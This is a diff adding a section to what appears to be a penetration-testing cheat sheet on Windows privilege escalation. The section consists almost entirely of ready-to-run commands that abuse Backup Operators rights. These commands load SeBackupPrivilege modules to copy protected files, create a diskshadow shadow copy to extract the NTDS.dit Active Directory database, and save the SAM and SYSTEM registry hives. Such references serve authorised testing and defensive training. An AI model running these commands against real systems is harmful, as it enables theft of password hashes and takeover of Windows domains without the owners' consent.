@@ -2501,6 +2501,41 @@ C:\> icacls "<file"
 C:\> icacls "<file>" /grant <username>:F
 ```
 
+- Backup Operators
+
+```
+https://github.com/giuliano108/SeBackupPrivilege
+PS C:\> Import-Module .\SeBackupPrivilegeUtils.dll
+PS C:\> Import-Module .\SeBackupPrivilegeCmdLets.dll
+PS C:\> Get-SeBackupPrivilege
+PS C:\> Set-SeBackupPrivilege
+PS C:\> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+```
+
+- Backup Operators (NTDS.dit)
+
+```
+PS C:\> diskshadow.exe
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+PS C:\> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+```
+
+- Backup Operators (SAM/SYSTEM)
+
+```
+C:\> reg save HKLM\SYSTEM SYSTEM.SAV
+C:\> reg save HKLM\SAM SAM.SAV
+```
+
 #6. - Persistence
 -----------------------------------------
 
